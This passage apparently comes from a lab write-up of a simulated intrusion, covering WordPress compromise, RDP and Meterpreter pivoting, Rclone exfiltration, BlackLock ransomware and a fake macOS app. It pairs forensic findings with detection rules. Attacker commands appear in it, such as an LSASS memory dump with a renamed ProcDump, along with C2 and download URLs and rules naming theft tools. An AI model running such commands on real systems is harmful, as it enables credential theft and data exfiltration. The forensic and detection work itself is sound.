Result: Rules were properly configured to log system calls (-k exec), so I could trace the attacker's commands.

docs.title: 🐚 Phase 3: Persistence & Backdoor
docs.text:
After gaining administrative access to the CMS, the attacker needed a way to execute system-level commands.

File Artifacts

Evidence: The command history reveals the attacker used vim to modify a specific theme file, injecting a web shell into the error page template.

Finding: /var/www/html/wordpress/wp-content/themes/blocksy/404.php

docs.title: 🔓 Phase 4: Privilege Escalation
docs.text:
The attacker entered as the www-data user but quickly escalated to root. I used the Linux audit logs (ausearch) to trace their steps.

Step 1: Tracking UserStep 2: Escalation Vector

Action: I searched for execution events linked to the suspicious user ID (1002) to identify the start of the escalation chain.

Evidence: The decoded audit logs reveal the attacker found a backup SSH key, copied it to /tmp, changed its permissions, and used it to SSH into localhost as root.

Finding: /etc/ssh/id_ed25519.bak

docs.title: 📡 Phase 5: Internal Reconnaissance
docs.text:
With root access secured, the attacker used the compromised server as a pivot point to scan the internal network.

Bash History

Action: Reviewing /root/.bash_history for manual commands executed by the attacker.

Evidence: The history shows netcat (nc) scans against ports 22, 80, and 3389 on a specific internal host.

Finding: 172.16.8.216

docs.title: 🦠 Phase 6: Malware Analysis
docs.text:
I found a suspicious service disguised as a kernel process, used for persistence.

Binary Analysis

Action: Checking kworker.service. Real kworker threads belong to the kernel and never run from a file on disk, so a kworker binary in /usr/sbin/ is a clear masquerade (T1036.005).

Evidence: Calculated the hash of the suspicious binary.

Finding: d6f2d80e78f264aff8c7aea21acb6ca6

docs.title: 🚩 Phase 7: Recovery
docs.text:
Finally, I regained control of the honeypot by running the deceptipot binary in recovery mode with the recovery key stored in its configuration.

Lesson

The recovery key sat in a readable config file on the same server the attacker controlled. Anyone with root could use it too; it belongs in a secrets vault.

docs.title: 🔔 Detection Opportunities
docs.text:
Detections I would add

These are example queries; index and field names depend on your environment.

WordPress brute forceEdits to theme PHP filesBinary pretending to be a kernel thread 
index=web uri_path="/wp-login.php" method=POST
| bin _time span=5m
| stats count BY _time clientip
| where count > 20


index=linux sourcetype=linux_audit type=PATH name="*/wp-content/themes/*.php"
    nametype IN ("CREATE", "NORMAL")
| table _time auid uid exe name
Theme files should only change during updates, never from vim on a live server.

title: Process named kworker running from disk
logsource: { product: linux, category: process_creation }
detection:
  selection:
    Image|contains: 'kworker'
  condition: selection
level: critical
Kernel threads have no executable path, so any kworker process with an image path on disk is malicious.

docs.title: 🛡️ Case Verdict
docs.text:
Compromise Summary
  • Vector: WordPress Brute Force
  • Persistence: Web shell in 404.php + fake kworker.service
  • Escalation: Readable SSH backup key (/etc/ssh/id_ed25519.bak)
  • Next Hop: Port scan of 172.16.8.216
Remediation & Next Steps Remove the web shell and fake service, delete the backup key and rotate root SSH keys, then rebuild the server. The attacker scanned 172.16.8.216 next, so the Windows server is the next host to investigate. ← Back to Operation Dashboard Next: Task 2 (Windows Triage) →

docs.title: Task 2 Windows Triage
docs.text:
# 🪟 Task 2: Elevating Movement Event ID: 1149 Tactic: Lateral Movement Malware: Meterpreter Tracing the attacker's pivot from the Linux server to the internal Windows server. I investigated RDP access, a replaced binary used for persistence, and credential dumping.

Summary

What happened: The attacker logged in over RDP as emily.ross at 2025-06-30 16:33:18, replaced Coreinfo64.exe with a Meterpreter stager to gain higher privileges, dumped LSASS with a renamed ProcDump (pcd.exe), and used the stolen credentials to move on with PsExec at 19:47:14.

Impact: Privileged code execution on the Windows server and theft of cached credentials, including matthew.collins.

Key IOCs: C:\Users\emily.ross\Documents\Coreinfo64.exe · pcd.exe · PSEXESVC service

🚨 Security Alert: Domain Compromise

Trigger: Valid Account abuse via RDP followed by suspicious service installation.

Initial Assessment: The attacker used credentials stolen from the Linux server to move laterally to the Windows environment (172.16.8.216).

Investigation Goal: Identify the malware used for privilege escalation and the method used to dump domain credentials.

docs.title: 🚪 Phase 1: Ingress (RDP Access)
docs.text:
The attacker found this Windows host during their scan from the Linux server. I checked the Windows Event Logs for incoming Remote Desktop connections.

Event ViewerFindings

Action: filtering for Event ID 1149 (Remote Desktop Services - User Authentication Succeeded) in the TerminalServices-RemoteConnectionManager log.

Result: Valid Account Abuse

Observation: A successful RDP authentication occurred for the user emily.ross originating from the Linux server subnet.

Finding: 2025-06-30 16:33:18

docs.title: 🛠️ Phase 2: Persistence & Privilege Escalation
docs.text:
Once inside, the attacker replaced a legitimate binary to keep access and escalate privileges. I analysed PowerShell transcripts to find the modified file.

PowerShell TranscriptArtifact Analysis

Action: Reviewing transcript logs revealed the execution of a suspicious executable located in a user's Documents folder.

Evidence: The transcript shows the "Host Application" pointing to a tool masquerading as Sysinternals Coreinfo.

Finding: C:\Users\emily.ross\Documents\Coreinfo64.exe

docs.title: 🦠 Phase 3: Malware Identification
docs.text:
I needed to know whether Coreinfo64.exe was legitimate, so I hashed it and checked the hash against threat intelligence.

Hash CalculationThreat Intel

Action: Using Get-FileHash to generate the MD5 fingerprint of the binary.

Evidence: Community detection rules identify the sample as a Meterpreter Stager, a payload often used with the Metasploit Framework.

Finding: Meterpreter

docs.title: 🔓 Phase 4: Credential Dumping
docs.text:
With high privileges secured via Meterpreter, the attacker dumped credentials. I found obfuscated commands in the PowerShell logs.

Encoded CommandDecoding

Action: I identified a Base64-encoded string executed via IEX (Invoke-Expression).

Evidence: Decoding the string reveals the use of pcd.exe (likely a renamed ProcDump tool) to dump the LSASS memory process.

Finding: pcd.exe /accepteula -ma lsass.exe text.txt

docs.title: 🔄 Phase 5: Lateral Movement
docs.text:
Finally, I tracked the attacker's movement deeper into the network with the stolen credentials.

Registry ForensicsTimeline Analysis

Action: I searched the SYSTEM hive for the PsExec service (PSEXESVC), a common lateral movement tool.

Evidence: PsExec installs the PSEXESVC service on the machine it connects to, so this key marks the attacker arriving on this host. The key's last write time is the best available timestamp for that moment (a last write time shows the latest change to the key, not every run).

Finding: 2025-06-30 19:47:14

docs.title: 🔔 Detection Opportunities
docs.text:
Detections I would add

These are example queries; index and field names depend on your environment.

LSASS dumpEncoded PowerShellPsExec service installed 

title: ProcDump-style LSASS memory dump
logsource: { product: windows, category: process_creation }
detection:
  selection:
    CommandLine|contains|all: ['-ma', 'lsass']
  condition: selection
level: critical
Matches on the arguments, so renaming procdump.exe to pcd.exe does not help the attacker.

index=wineventlog EventCode=4104
    (ScriptBlockText="*FromBase64String*" AND ScriptBlockText="*IEX*")
| table _time host user ScriptBlockText


index=wineventlog EventCode=7045 Service_Name="PSEXESVC"
| table _time host Service_Name Service_File_Name
Event 7045 logs every new service; PsExec creates PSEXESVC on each target.

docs.title: 🛡️ Case Verdict
docs.text:
Compromise Summary
  • Method: RDP via Stolen Creds
  • Malware: Meterpreter (Coreinfo64.exe)
  • Credential Dump: LSASS via renamed ProcDump (pcd.exe)
  • Exposed Hash: eb3d2de2f21b31933fb4a4fd7a7d314d (matthew.collins)
  • Lateral Movement: PsExec, 2025-06-30 19:47:14
Remediation & Next Steps Reset emily.ross and matthew.collins (and every account whose credentials were in LSASS), restore the original Coreinfo binary, and enable LSA protection (RunAsPPL) to block LSASS dumping. Memory forensics comes next, to find what else was injected. ← Previous: Task 1 Next: Task 3 (Memory Forensics) →

docs.title: Task 3 Memory Forensics
docs.text:
# 🧠 Task 3: Lost in RAMslation Tool: Volatility 3 Tactic: Process Injection Technique: Rundll32 Proxy Execution Analysing the RAM image of the compromised Windows server. I tracked the malware execution chain from a malicious DLL load to shellcode injection in a legitimate process.

Summary

What happened: rundll32.exe (PID 2928) ran C:\Windows\Tasks\MicrosoftUpdate.dll through its RunMe export. The DLL launched security-update.exe, which injected Meterpreter shellcode into notepad.exe (PID 836). PowerShell on the host then held an RDP connection to 172.16.2.9.

Impact: Hidden Meterpreter session in memory and a new lateral movement target.

Key IOCs: MicrosoftUpdate.dll · security-update.exe · shellcode starting fc4889ce48 · 172.16.2.9:3389

🚨 Security Alert: In-Memory Threat Detected

Trigger: Suspicious process relationships and network connections identified in memory dump SRV-DMZ-GW-evidence.mem.

Initial Assessment: The attacker used rundll32.exe to execute a malicious payload, which then injected shellcode into a legitimate process (notepad.exe) to hide its activity.

Investigation Goal: Extract the malware configuration, identify the injected shellcode, and determine the next lateral movement target.

docs.title: 🔎 Phase 1: Initial Execution Vector
docs.text:
I began with the process tree (windows.pstree) to identify the parent process responsible for the infection.

Process TreeArtifact Analysis

Action: filtering for suspicious parent-child relationships using vol -f ... windows.pstree.

Evidence: The process rundll32.exe (PID 2928) was loading a DLL from C:\Windows\Tasks, a legacy scheduled-task folder that normal users can write to and that no real DLL lives in.

Finding: C:\Windows\Tasks\MicrosoftUpdate.dll

Finding: 2928

docs.title: 💻 Phase 2: Command Line Forensics
docs.text:
To understand how the DLL was run, I extracted the full command line arguments using the windows.cmdline plugin.

Command ExtractionFindings

Action: Analyzing the arguments passed to PID 2928.

Evidence: The attacker used the specific entry point RunMe to trigger the malicious code within the DLL.

Finding: rundll32.exe C:\windows\tasks\MicrosoftUpdate.dll, RunMe

docs.title: ⛓️ Phase 3: The Execution Chain
docs.text:
Following the malware further, I saw it spawn a chain of child processes, ending in a process that looks harmless.

Process ChainFinal Payload

Action: Following the tree: rundll32.exe -> security-update.exe -> notepad.exe.

Evidence: The malware ultimately injected itself into notepad.exe (PID 836) to blend in with normal user activity.

Finding: notepad.exe

docs.title: 💉 Phase 4: Shellcode Analysis
docs.text:
I used windows.malfind to look for injected code: private memory that is both writable and executable (PAGE_EXECUTE_READWRITE) and not backed by a file on disk.

Memory DumpHex Analysis

Action: Inspecting the memory space of notepad.exe revealed a suspicious executable segment.

Evidence: The region starts with fc 48 89 ce 48. fc is the CLD instruction, the usual first byte of Metasploit x64 shellcode, and 48 89 ce is mov rsi, rcx. Executable code at the start of a non-file-backed region in notepad.exe confirms the injection.

Finding: fc4889ce48

docs.title: 🌐 Phase 5: Lateral Movement Tracking
docs.text:
Finally, I used windows.netscan to see if the malware established any active network connections.

Network ConnectionsListening PortsTarget Identification

Action: Filtering for established connections, specifically on RDP ports (3389).

Action: I also checked for listening ports to see if the malware was waiting for incoming connections.

Evidence: An ESTABLISHED connection to port 3389 on a new internal IP was owned by powershell.exe. RDP sessions normally come from mstsc.exe, so PowerShell holding this connection points to tunnelling or port forwarding by the attacker.

Finding: 172.16.2.9

docs.title: 🔔 Detection Opportunities
docs.text:
Detections I would add

These are example queries; index and field names depend on your environment.

rundll32 loading from odd foldersnotepad.exe making network connectionsPowerShell on port 3389 
title: Rundll32 loading DLL from user-writable folder
logsource: { product: windows, category: process_creation }
detection:
  selection:
    Image|endswith: '\rundll32.exe'
    CommandLine|contains:
      - '\Windows\Tasks\'
      - '\AppData\'
      - '\Temp\'
  condition: selection
level: high


index=sysmon EventCode=3 Image="*\\notepad.exe"
| table _time host Image DestinationIp DestinationPort
Notepad has no reason to talk to the network; a connection is a strong injection signal.

index=sysmon EventCode=3 DestinationPort=3389 Image="*\\powershell.exe"
| table _time host User DestinationIp

docs.title: 🛡️ Case Verdict
docs.text:
Memory Findings
  • Payload: C:\Windows\Tasks\MicrosoftUpdate.dll via rundll32 (T1218.011)
  • Chain: rundll32.exe → security-update.exe → notepad.exe
  • Injection: Meterpreter shellcode in notepad.exe, PID 836 (T1055)
  • Next Hop: RDP to 172.16.2.9
Remediation & Next Steps Isolate the server, remove the DLL and security-update.exe, and block outbound connections from it. The attacker moved on to 172.16.2.9, so that host's disk is analysed next. ← Previous: Task 2 Next: Task 4 (Disk Analysis) →

docs.title: Task 4 Disk Analysis
docs.text:
# 💾 Task 4: CRM Snatch Tool: Registry Explorer Tactic: Exfiltration Technique: Data Staging Investigating the disk image of the compromised workstation. I analysed user artefacts to identify the account used for lateral movement and the tools used to steal sensitive CRM data.

Summary

What happened: The attacker used matthew.collins to open a PowerShell session for about 57 minutes, downloaded Rclone from 167.172.41.141 and uploaded a CRM user export to an attacker-controlled Mega account.

Impact: Exfiltration of employee personal data (names, emails) from the CRM.

Key IOCs: 167.172.41.141 · rclone-v1.70.2-windows-amd64 · mega.conf

🚨 Security Alert: Data Exfiltration Detected

Trigger: High-volume outbound traffic detected from a workstation to a known cloud storage provider.

Initial Assessment: The attacker compromised a domain user account, staged sensitive corporate data, and utilized a command-line tool to upload it to external storage.

Investigation Goal: Identify the compromised account, the C2 infrastructure, the exfiltration tool, and the scope of the data breach.

docs.title: 👤 Phase 1: User Forensic Analysis
docs.text:
I began with the NTUSER.DAT hive and PowerShell history files to determine which account was compromised and how long the attacker was active.

Account IdentificationSession DurationFindings

Action: I located the PowerShell history file (ConsoleHost_history.txt). Its path shows which user profile ran the commands.

Action: Analyzing the UserAssist registry key (NTUSER.DAT) to calculate the execution time of powershell.exe.

Account used: matthew.collins, the account whose hash was dumped on the previous host (path C:\Users\matthew.collins\...).

PowerShell session length: UserAssist records a focus time of 0d, 0h, 57m, 35s for powershell.exe, which is (57 × 60) + 35 = 3455 seconds.

Focus time counts how long the window was in the foreground, so it is a close estimate of hands-on-keyboard time rather than an exact session length.

docs.title: 📡 Phase 2: C2 Infrastructure & Tooling
docs.text:
The PowerShell history revealed the commands used to download exfiltration tools from an external Command and Control (C2) server.

Download CommandsFindings

Action: Reviewing the ConsoleHost_history.txt content revealed Invoke-WebRequest calls used to fetch tools.

Evidence: The URL http://167.172.41.141/rclone... was used to download the malicious toolkit.

Finding: 167.172.41.141

Evidence: The filename rclone-v1.70.2-windows-amd64 confirms the use of Rclone, a command-line program to manage files on cloud storage.

Finding: Rclone

docs.title: ☁️ Phase 3: Exfiltration Configuration
docs.text:
I examined the configuration files left behind by the attacker to understand where the data was sent.

Rclone ConfigCredentials

Action: I found mega.conf in the staging directory, used by Rclone to authenticate with the cloud provider.

Evidence: The config holds the password for the mega remote in Rclone's "obscured" format. This is encoding, not encryption: rclone reveal turns it back into plain text, so investigators can log in to the attacker's account and see what was uploaded.

Finding: yWKgVA7Rv1iIoG-VWAr7NAFbwKHNiMZGNybJ4QybJHtiFg

docs.title: 📉 Phase 4: Impact Assessment
docs.text:
Finally, I analysed the staged files to determine exactly what data was stolen from the CRM system.

Stolen DataVictim Identification

Action: Opening the Users_export file found in the staging folder revealed a list of employee details.

Evidence: The CSV export lists user details, specifically the entry for Lucas Rivera.

Finding: lucas.rivera@deceptitech.thm

docs.title: 🔔 Detection Opportunities
docs.text:
Detections I would add

These are example queries; index and field names depend on your environment.

Rclone executionTools downloaded by PowerShellTraffic to file-sharing sites 
title: Rclone used to copy data to cloud storage
logsource: { product: windows, category: process_creation }
detection:
  selection_name:
    - Image|endswith: '\rclone.exe'
    - OriginalFileName: 'rclone.exe'
  selection_renamed:
    CommandLine|contains|all: ['--config', 'mega']
  condition: selection_name or selection_renamed
level: high

index=wineventlog EventCode=4104 ScriptBlockText="*Invoke-WebRequest*"
| rex field=ScriptBlockText "(?<url>https?://[^\s'\"]+)"
| table _time host user url

index=proxy (dest_host="*mega.nz" OR dest_host="*mega.co.nz" OR dest_host="*mega.io")
| stats sum(bytes_out) AS bytes_out BY src_ip user
| where bytes_out > 50000000

docs.title: 🛡️ Case Verdict
docs.text:
Exfiltration Summary
  • Compromised User: matthew.collins
  • Tool: Rclone (to Mega.nz)
  • C2 Node: 167.172.41.141
Remediation & Next Steps Data theft is confirmed: the CRM user export was sent to Mega. Block 167.172.41.141 and Mega domains, disable matthew.collins, and prepare a breach notification for the exposed employees. The file system is analysed next to find the ransomware itself. ← Previous: Task 3 Next: Task 5 (File System) →

docs.title: Task 5 File System
docs.text:
# 🌩️ Task 5: Shock and Silence Tool: MFTECmd Tactic: Impact Malware: BlackLock Analyzing the Master File Table (MFT) and file system artifacts to reconstruct the ransomware deployment. I traced the payload from download to execution and encryption.

Summary

What happened: HiddenFile.zip was downloaded from gofile.io, giving the ransomware pb.exe. HpAgent.exe then encrypted user files with the .EeUfy extension and dropped README.txt ransom notes. The note's onion site and format match the BlackLock ransomware group.

Impact: Files encrypted across the host, on top of the data already stolen (double extortion).

Key IOCs: store5.gofile.io/.../HiddenFile.zip · pb.exe · HpAgent.exe · .EeUfy

🚨 Security Alert: Ransomware Detonation

Trigger: Widespread file modification and creation of ransom notes detected across the file system.

Initial Assessment: The attacker successfully downloaded a payload, renamed it to evade detection, and executed a crypto-ransomware strain that appended a unique extension to victim files.

Investigation Goal: Identify the delivery URL, the specific malware executable, and the threat actor responsible.

docs.title: 📥 Phase 1: Delivery & Download
docs.text:
I started by parsing the $MFT (Master File Table) using MFTECmd to find evidence of file downloads. Windows adds a Zone.Identifier alternate data stream (the "Mark of the Web") to downloaded files, and it often records the source URL.

MFT ParsingSource Identification

Action: Processing the MFT to extract metadata about recently created files.

Evidence: The Zone.Identifier contents for a suspicious zip file reveal it was downloaded from a file-sharing site.

Finding: https://store5.gofile.io/download/web/e23cb33f-0e4d-4a5f-8c55-ea2d78057d40/HiddenFile.zip

docs.title: 🎭 Phase 2: Payload Identification
docs.text:
After downloading the archive, the attacker extracted and renamed the executable to blend in. I used timeline analysis to find the original filename.

File TimelineFindings

Action: Analyzing the creation events in the download directory.

Evidence: The file timeline shows the creation of pb.exe immediately following the download.

Finding: pb.exe

docs.title: ⚙️ Phase 3: Execution & Encryption
docs.text:
The attacker did not run pb.exe directly for the encryption phase. Instead, they utilized another executable to perform the actual locking of files.

Execution ArtifactsProcess ID

Action: Correlating the timestamp of file encryption with running processes.

Evidence: The timeline shows HpAgent.exe active exactly when the files began to be modified.

Finding: HpAgent.exe

docs.title: 🔒 Phase 4: Impact Analysis
docs.text:
I examined the file system to determine the scope of the damage and the specific indicators of compromise (IOCs).

Encrypted FilesExtension

Action: Listing files in the user's directory revealed the extension appended by the malware.

Evidence: All user files have been renamed with the .EeUfy extension.

Finding: EeUfy

docs.title: 🏴‍☠️ Phase 5: Attribution
docs.text:
Finally, I analysed the ransom note to identify the group behind the attack.

Ransom NoteGroup Identity

Action: Opening the README.txt file found in the encrypted directories.

Evidence: The onion URL and the specific formatting of the note are characteristic of the BlackLock ransomware group.

Finding: BlackLock

docs.title: 🔔 Detection Opportunities
docs.text:
Detections I would add

These are example queries; index and field names depend on your environment.

Mass file renamesExecutables from file-sharing sitesRansom notes appearing 

index=sysmon EventCode=11 TargetFilename="*.EeUfy"
| bin _time span=1m
| stats count BY _time host Image
| where count > 100
In practice, alert on any process creating hundreds of files with the same new extension in a minute.

index=sysmon EventCode=15
    (Contents="*gofile.io*" OR Contents="*mega.nz*" OR Contents="*transfer.sh*")
| table _time host TargetFilename Contents
Sysmon Event 15 captures Zone.Identifier streams, including the download URL.

index=sysmon EventCode=11 TargetFilename="*\\README.txt"
| stats dc(TargetFilename) AS notes BY host Image
| where notes > 20

docs.title: 🛡️ Case Verdict
docs.text:
Ransomware Profile
  • Group: BlackLock
  • Payload: pb.exe from HiddenFile.zip; encryption run by HpAgent.exe
  • Extension: .EeUfy
  • Delivery: Gofile.io (Manual Download)
Remediation & Next Steps Isolate affected hosts, restore from offline backups, block gofile.io downloads, and hunt for HpAgent.exe and .EeUfy files on every endpoint. The final step is the CEO's macOS laptop, to check for further data theft. ← Previous: Task 4 Next: Task 6 (MacOS Forensics) →

docs.title: Task 6 MacOS Forensics
docs.text:
# 🍎 Task 6: MacOS Forensics Tool: Plistutil / Sqlite3 Tactic: Collection Persistence: LaunchAgent Investigating the CEO's MacBook. I analysed Safari artefacts, installer receipts and the TCC database to track data theft on macOS.

Summary

What happened: On 2025-07-04 the CEO installed DevelopAIInstaller.pkg from developai.thm. The fake app asked for TCC access to the Desktop folder first, used a bash script to POST files to c7.macos-updatesupport.info:8080 with curl, and added a LaunchAgent so it runs at every login.

Impact: Ongoing theft of the CEO's files.

Key IOCs: developai.thm · DevelopAIInstaller.pkg · bundle ID org.aiArt.DevelopAI · c7.macos-updatesupport.info:8080

🚨 Security Alert: Suspicious macOS Activity

Trigger: Endpoint detection flagged an unsigned installer requesting broad file system permissions.

Initial Assessment: The user downloaded a "fake" AI application which installed a persistent backdoor and exfiltrated documents to a remote server.

Investigation Goal: Identify the source of the malware, the installation timestamp, and the persistence mechanism used.

docs.title: 📥 Phase 1: Delivery Vector
docs.text:
I began with Safari's download history (Downloads.plist) to identify where the malicious file came from.

Safari ForensicsFindings

Action: Parsing ~/Library/Safari/Downloads.plist to view file origin metadata.

Evidence: The DownloadEntryURL field points to a suspicious internal domain simulating a software vendor.

Finding: developai.thm

Evidence: The DownloadEntryPath shows the file saved to disk.

Finding: DevelopAIInstaller.pkg

docs.title: ⏱️ Phase 2: Installation Timeline
docs.text:
To find exactly when the compromise happened, I checked the macOS package receipts.

Package ReceiptsTimestamp

Action: Parsing /private/var/db/receipts/com.developai.app.plist using plistutil.

Evidence: The InstallDate key records exactly when the package was installed.

Finding: 2025-07-04 10:09:03

docs.title: 🔓 Phase 3: Permissions (TCC)
docs.text:
macOS uses TCC (Transparency, Consent and Control) to control which apps can reach private folders. I queried the TCC database to see what access the malware asked for. No bypass was needed: the app simply asked, and the user clicked Allow.

TCC DatabaseAccess Requests

Action: Querying TCC.db to view the access table for the malicious bundle identifier org.aiArt.DevelopAI.

Evidence: The earliest timestamped request (at 10:10:33) corresponds to the Desktop Folder access.

Finding: kTCCServiceSystemPolicyDesktopFolder

docs.title: 📡 Phase 4: Exfiltration & C2
docs.text:
I examined the application's internal scripts to find the exfiltration logic.

Script AnalysisC2 Infrastructure

Action: Analyzing the bash script found within the application resources revealed the C2 server.

Evidence: The variable LR defines the remote server receiving the stolen data via curl POST requests.

Finding: http://c7.macos-updatesupport.info:8080

docs.title: 🔄 Phase 5: Persistence
docs.text:
Finally, I identified how the malware ensured it would run every time the user logged in.

Launch AgentsMechanism

Action: Listing the contents of ~/Library/LaunchAgents/ revealed a suspicious property list and script.

Evidence: The presence of a .plist file in Library/LaunchAgents confirms the persistence method.

Finding: LaunchAgent

docs.title: 🔔 Detection Opportunities
docs.text:
Detections I would add

These are example queries; index and field names depend on your environment.

New LaunchAgentScript uploading files with curlUnexpected TCC grants 
title: LaunchAgent plist created by non-Apple process
logsource: { product: macos, category: file_event }
detection:
  selection:
    TargetFilename|contains: '/Library/LaunchAgents/'
    TargetFilename|endswith: '.plist'
  condition: selection
level: medium

title: curl uploading files from a macOS shell script
logsource: { product: macos, category: process_creation }
detection:
  selection:
    Image|endswith: '/curl'
    CommandLine|contains: ['-F ', '--data-binary', '-T ']
    ParentImage|endswith: ['/bash', '/sh', '/zsh']
  condition: selection
level: high


sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT service, client, auth_value, datetime(last_modified,'unixepoch')
   FROM access ORDER BY last_modified DESC LIMIT 20;"
A quick hunt query: list the newest permission grants and check each app is expected.

docs.title: 🛡️ Case Verdict
docs.text:
macOS Findings
  • Delivery: Fake AI installer DevelopAIInstaller.pkg from developai.thm
  • Access: User-approved TCC access to Desktop and other folders
  • Exfiltration: curl POSTs to c7.macos-updatesupport.info:8080
  • Persistence: LaunchAgent in ~/Library/LaunchAgents
Remediation
  • Remove the app and LaunchAgent, and reset its TCC grants with tccutil reset All org.aiArt.DevelopAI.
  • Block the C2 domain and the download site.
  • Allow only signed, notarised apps through MDM.

docs.title: 🏁 Full Attack Chain
docs.text:
Operation Honeynet Collapse: Summary
  • Linux: WordPress brute force → web shell → root via leaked SSH key
  • Windows: RDP with stolen credentials → Meterpreter → LSASS dump → PsExec
  • Data theft: CRM export sent to Mega with Rclone
  • Impact: BlackLock ransomware (.EeUfy)
  • macOS: Fake AI app stealing files from the CEO's laptop
